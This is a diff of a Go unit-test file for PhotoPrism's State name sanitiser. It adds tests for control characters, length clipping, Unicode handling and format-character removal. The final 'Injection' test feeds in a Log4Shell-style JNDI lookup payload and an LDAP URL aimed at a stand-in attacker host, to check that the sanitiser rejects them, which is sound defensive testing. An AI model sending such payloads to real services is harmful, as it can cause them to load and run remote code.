@@ -1,9 +1,12 @@
 package clean
 
 import (
+	"strings"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
+
+	"github.com/photoprism/photoprism/pkg/txt"
 )
 
 func TestState(t *testing.T) {
@@ -11,55 +14,78 @@ func TestState(t *testing.T) {
 		result := State("Berlin", "de")
 		assert.Equal(t, "Berlin", result)
 	})
-
 	t.Run("WA", func(t *testing.T) {
 		result := State("WA", "us")
 		assert.Equal(t, "Washington", result)
 	})
-
 	t.Run("QCUnknownCountry", func(t *testing.T) {
 		result := State("QC", "")
 		assert.Equal(t, "QC", result)
 	})
-
 	t.Run("QCCanada", func(t *testing.T) {
 		result := State("QC", "ca")
 		assert.Equal(t, "Quebec", result)
 	})
-
 	t.Run("QCUnitedStates", func(t *testing.T) {
 		result := State("QC", "us")
 		assert.Equal(t, "QC", result)
 	})
-
 	t.Run("Wa", func(t *testing.T) {
 		result := State("Wa", "us")
 		assert.Equal(t, "Wa", result)
 	})
-
 	t.Run("Washington", func(t *testing.T) {
 		result := State("Washington", "us")
 		assert.Equal(t, "Washington", result)
 	})
-
-	t.Run("Never mind Nirvana", func(t *testing.T) {
+	t.Run("NeverMindNirvana", func(t *testing.T) {
 		result := State("Never mind Nirvana.", "us")
 		assert.Equal(t, "Never mind Nirvana.", result)
 	})
-
 	t.Run("Empty", func(t *testing.T) {
 		result := State("", "us")
 		assert.Equal(t, "", result)
 	})
-
 	t.Run("Unknown", func(t *testing.T) {
 		result := State("zz", "us")
 		assert.Equal(t, "", result)
 	})
-
 	t.Run("Space", func(t *testing.T) {
 		result := State(" ", "us")
 		assert.Equal(t, "", result)
+	})
+	t.Run("ControlCharacter", func(t *testing.T) {
+		result := State("Washington"+string(rune(127)), "us")
+		assert.Equal(t, "Washington", result)
+	})
+	t.Run("SpecialChars", func(t *testing.T) {
+		result := State("Wa?shing*ton"+string(rune(127)), "us")
+		assert.Equal(t, "Washington", result)
+	})
+	t.Run("LongName", func(t *testing.T) {
+		got := State(strings.Repeat("a", txt.ClipName+50), "")
+		assert.Equal(t, txt.ClipName, len(got))
+		assert.Equal(t, strings.Repeat("a", txt.ClipName), got)
+	})
+	t.Run("LongMultiByte", func(t *testing.T) {
+		got := State(strings.Repeat("陈", txt.ClipName+50), "")
+		assert.Equal(t, txt.ClipName, len([]rune(got)))
+		assert.Equal(t, got, string([]rune(got)))
+	})
+	t.Run("JoinersKept", func(t *testing.T) {
+		assert.Equal(t, "\u0686\u0647\u0627\u0631\u0645\u200C\u0645\u062D\u0627\u0644", State("\u0686\u0647\u0627\u0631\u0645\u200C\u0645\u062D\u0627\u0644", "ir"))
+		assert.Equal(t, "\U0001F3F3\uFE0F\u200D\U0001F308 Pride", State("\U0001F3F3\uFE0F\u200D\U0001F308 Pride", ""))
+	})
+	t.Run("SpacesFolded", func(t *testing.T) {
+		assert.Equal(t, "Baden W\u00FCrttemberg", State("Baden\u00A0W\u00FCrttemberg", ""))
+		assert.Equal(t, "Baden W\u00FCrttemberg", State("Baden\u3000W\u00FCrttemberg", ""))
+	})
+	t.Run("FormatCharsRemoved", func(t *testing.T) {
+		assert.Equal(t, "Bayern", State("Bay\u202Eern\u200B", "de"))
+	})
+	t.Run("Injection", func(t *testing.T) {
+		assert.Equal(t, "", State("hello ${jndi:ldap://example.com/x}", ""))
+		assert.Equal(t, "", State("ldap://attacker.example/", ""))
 	})
 
 }
